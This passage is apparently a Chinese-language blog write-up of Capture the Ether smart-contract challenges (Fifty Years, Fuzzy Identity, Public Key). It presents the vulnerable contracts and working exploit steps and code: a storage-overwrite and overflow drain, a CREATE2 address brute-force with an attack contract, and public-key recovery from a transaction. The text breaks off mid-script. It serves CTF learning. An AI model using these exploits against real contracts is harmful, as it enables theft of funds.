<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        owner &#x3D; player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;&#x3D; head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            &#x2F;&#x2F; Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution &#x3D; queue[index];</span><br><span class="line">            contribution.amount +&#x3D; msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; Append a new contribution. Require that each contribution unlock</span><br><span class="line">            &#x2F;&#x2F; at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;&#x3D; queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount &#x3D; msg.value;</span><br><span class="line">            contribution.unlockTimestamp &#x3D; timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        require(now &gt;&#x3D; queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total &#x3D; 0;</span><br><span class="line">        for (uint256 i &#x3D; head; i &lt;&#x3D; index; i++) &#123;</span><br><span class="line">            total +&#x3D; queue[i].amount;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Move the head of the queue forward so we don&#39;t have to loop over</span><br><span class="line">        &#x2F;&#x2F; already-withdrawn contributions.</span><br><span class="line">        head &#x3D; index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tR-qQcNT_fY">100 Years</a>. I guess just listen to half of it.</p>
<p><strong>解题：</strong></p>
<p>通过前面几天题，我可以知道以下暂时可以得到信息：</p>
<ol>
<li><p>函数里使用了storage存储来初始化一个contribution结构体， 因此我们可以覆盖 queue 的长度以及 head 的值。</p>
<pre><code>  msg.value覆盖slot(0) -&gt; queue.length
  timestamp覆盖slot(1) -&gt; head</code></pre>
</li>
<li><p>溢出漏洞： <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code></p>
<p>queue 的长度可控， 动态数组queue 的变量所在的存储位计算规则为 <code>keccak256(slot) + index * elementsize</code> ,  <code>elementsize</code>  即为结构体Contribution的size</p>
</li>
</ol>
<p>利用思路：</p>
<ol>
<li><p>启动合约，此时 queue.length =1， head = 0</p>
</li>
<li><p>调用 <code>upsert(1, 2**256-24*60*60)</code>  通过溢出绕过 <code>require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</code> 检查，即 2**256 + 24 * 60 * 60 = 0；</p>
<p>此时 queue.length = 1 &amp; head = 2*<em>256-24</em>60*60</p>
</li>
<li><p>再调用一次 upsert(2, 0) , 调用后, queue.length = 2 &amp; head = 0</p>
</li>
<li><p>最后取出所有 balance <code>withdraw(2)</code></p>
</li>
</ol>
<p>step1:</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bb55f7096b52bade3eecbfba467eb62d-51245c.png"></a></p>
<p>step: 2</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-bf6122e01097faa518bcbc945c25ace2-3c0763.png"></a></p>
<p>然后在执行withraw 的时候发现失败了，通过调试以及查阅资料发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contribution的amount值并不是我们传递的msg.value的值，在其基础上还加了1.开始我也不太明白，后来debug发现原来queue.length也是msg.value+1，因为二者共用一块存储，应该是queue.length增加时也修改了amount的值，至于此处queue.length为何+1，则是因为queue.push操作，因为其在最后执行增添对象的任务，添加以后它会将queue.length进行+1操作</span><br><span class="line"></span><br><span class="line">这样一切就解释的通了，关键就是这里amount进行了+1，所以在withdraw是所统计的total事实上是大于合约所拥有的balance，所以transfer无法执行，这一点确实有点难到我了，必须想个办法抵消这一步+1的操作</span><br><span class="line"></span><br><span class="line">很快，我意识到我可以利用value来覆盖已有的contribution，既然发1 wei会加1，那我发两次，这样得到的amount就是2，也就是我实际发送的wei数目，所以把上面那两步写入操作都改成1 wei下的操作即可 。</span><br></pre></td></tr></table></figure>

<p><strong>参考资料：</strong></p>
<p><a href="https://www.anquanke.com/post/id/153375#h3-11">capture the ether write up(warmup and Math) - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h2 id="Account"><a href="#Account" class="headerlink" title="Account"></a>Account</h2><h3 id="1-Fuzzy-identity"><a href="#1-Fuzzy-identity" class="headerlink" title="1. Fuzzy identity"></a>1. Fuzzy identity</h3><p><strong>题目描述：</strong></p>
<p>This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:</p>
<ol>
<li>I always use a wallet contract that returns “smarx” if you ask its <code>name</code>.</li>
<li>Everything I write has bad code in it, so my address always includes the hex string <code>badc0de</code>.</li>
</ol>
<p>To complete this challenge, steal my identity!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() &#x3D;&#x3D; bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr &#x3D; bytes20(_addr);</span><br><span class="line">        bytes20 id &#x3D; hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask &#x3D; hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask &#x3D;&#x3D; id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;&#x3D; 4;</span><br><span class="line">            id &lt;&lt;&#x3D; 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=8wxBLq_C2KQ">Research Me Obsessively</a>.</p>
<p><strong>解题：</strong></p>
<p>题目要求：</p>
<ol>
<li><code> IName(addr).name() == bytes32(&quot;smarx&quot;);</code></li>
<li>地址中要存在  <code>badc0de</code></li>
</ol>
<p>通过查阅资料可以知道：</p>
<p>参考黄皮书公式(81)，部署合约时，目标地址有两种计算方式，分别为 <code>CREATE</code> 和 <code>CREATE2</code></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-aedbc263cf9014b44bfa488ac580a3a2-7b7f6a.png"></a></p>
<p>我们通过 <code>CREATE2</code> 爆破salt计算合约地址，包含badc0de即可</p>
<ol>
<li>部署攻击合约的部署合约利用create2获取包含特定字符的攻击合约地址</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.12;</span><br><span class="line">contract FuzzyIdentitySolverDeployer &#123;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code, uint256 salt) public</span><br><span class="line">returns(address) &#123;</span><br><span class="line"></span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line"></span><br><span class="line">          addr :&#x3D; create2(0, add(code, 0x20), mload(code), salt)</span><br><span class="line">          if iszero(extcodesize(addr)) &#123;</span><br><span class="line"></span><br><span class="line">            revert(0, 0)</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署上述合约并获取合约地址： </p>
<ol start="2">
<li>编译攻击合约代码， 并获取攻击合约代码的 bytecode</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IFuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function authenticate() external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallengeSolver &#123;</span><br><span class="line">    function name() public pure returns (bytes32) &#123;</span><br><span class="line"></span><br><span class="line">        return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _addr) public &#123;</span><br><span class="line">        IFuzzyIdentityChallengeSolver(_addr).authenticate();</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;linkReferences&quot;</span>: &#123;&#125;,</span><br><span class="line">	<span class="attr">&quot;object&quot;</span>: <span class="string">&quot;608060405234801561001057600080fd5b5061019a806100206000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610084575b600080fd5b34801561005d57600080fd5b506100666100c7565b60405180826000191660001916815260200191505060405180910390f35b34801561009057600080fd5b506100c5600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100ef565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b50505050505600a165627a7a723058208dfe2548775f3de8273867b8111a10cf9a9ad2fbde6b7c8d41ececc20f7367380029&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;opcodes&quot;</span>: <span class="string">&quot;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x19A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x84 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x66 PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xEF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH32 0x736D617278000000000000000000000000000000000000000000000000000000 SWAP1 POP SWAP1 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x380C7A67 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x167 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 DUP14 INVALID 0x25 0x48 PUSH24 0x5F3DE8273867B8111A10CF9A9AD2FBDE6B7C8D41ECECC20F PUSH20 0x6738002900000000000000000000000000000000 &quot;</span>,</span><br><span class="line">	<span class="attr">&quot;sourceMap&quot;</span>: <span class="string">&quot;107:239:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;107:239:0;;;;;;;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]计算攻击合约地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="comment"># CREATE2</span></span><br><span class="line"><span class="comment"># keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create2</span>(<span class="params">deployer, salt_hexstr, hashed_bytecode</span>):</span></span><br><span class="line">    addr_hexbytes = Web3.keccak(hexstr=(<span class="string">&#x27;ff&#x27;</span> + deployer + salt_hexstr +</span><br><span class="line">hashed_bytecode))</span><br><span class="line">    addr = Web3.toHex(addr_hexbytes)[<span class="number">-40</span>:]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"><span class="comment"># expecting deployer=&#x27;aabbccdd&#x27; (20 bytes -&gt; 40 characters)</span></span><br><span class="line"><span class="comment"># salt = some decimal number</span></span><br><span class="line"><span class="comment"># bytecode = &#x27;aabbccddeeff...&#x27; (variable length)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2</span>(<span class="params">deployer, salt, bytecode</span>):</span></span><br><span class="line">    <span class="keyword">assert</span>(len(deployer) == <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(bytecode) % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">    salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2_search</span>(<span class="params">deployer, predicate, bytecode</span>):</span></span><br><span class="line">    salt = <span class="number">0</span></span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        salt += <span class="number">1</span></span><br><span class="line">        salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">        addr = _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line">        <span class="keyword">if</span> salt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&#x27;.&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> predicate(addr):</span><br><span class="line">            print(<span class="string">f&quot;\nFound a match after <span class="subst">&#123;salt&#125;</span> attempts: <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">f&quot;Usage: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> deployer_addr &lt;salt |predicate&gt; bytecode&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a salt value, this script prints theaddress of the newly deployed contract based on the deployer address andbytecode hash.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE 42 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a predicate, this script will search for a salt value such that the new address satisfies the predicate.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE &#x27;lambda addr: \&quot;badc0de\&quot; inaddr.lower()&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Another predicate that may be useful: &#x27;lambda addr:addr.startswith(\&quot;0\&quot; * 8)&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    deployer_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> deployer_addr.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        deployer_addr = deployer_addr[<span class="number">2</span>:]</span><br><span class="line">    bytecode = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        salt = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">        print(create2(deployer_addr, salt, bytecode))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        predicate = eval(sys.argv[<span class="number">2</span>])</span><br><span class="line">        create2_search(deployer_addr, predicate, bytecode)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<pre><code>通过计算出来的合约攻击目标地址</code></pre>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png"></a></p>
<h3 id="2-Public-Key"><a href="#2-Public-Key" class="headerlink" title="2. Public Key"></a>2. Public Key</h3><p><strong>题目描述：</strong></p>
<p>Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key.</p>
<p>To complete this challenge, find the public key for the <code>owner</code>‘s account.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qp9JriLfH1w">Public Key Infrastructure</a>.</p>
<p><strong>解题：</strong></p>
<p>题目提供我们一个合约的地址，要求我们得到该地址的公钥。 这里涉及到以太坊的交易签名算法。当我们知道 r、s、v 和 hash时我们可以恢复出公钥。</p>
<p>R 、S、V 可以通过如下方法获得， 首先找到由这个账户发起的交易，然后通过脚本计算， 完整脚本如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/address/0x92b28647ae1f3264661f72fb2eb9625a89d88a31</span></span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/getRawTx?tx=0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb</span></span><br><span class="line">    <span class="keyword">const</span> tx = ethers.utils.parseTransaction(<span class="string">&#x27;0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;</span>);</span><br><span class="line">    <span class="comment">// console.log(tx.r)</span></span><br><span class="line">    <span class="comment">// console.log(tx.s)</span></span><br><span class="line">    <span class="comment">// console.log(tx.v)</span></span><br><span class="line">      <span class="comment">// code to recover the public key from https://ethereum.stackexchange.com/questions/78815/ethers-js-recover-public-key-from-contract-deployment-via-v-r-s-values</span></span><br><span class="line">    <span class="keyword">const</span> expandedSig = &#123;</span><br><span class="line">        r: tx.r,</span><br><span class="line">        s: 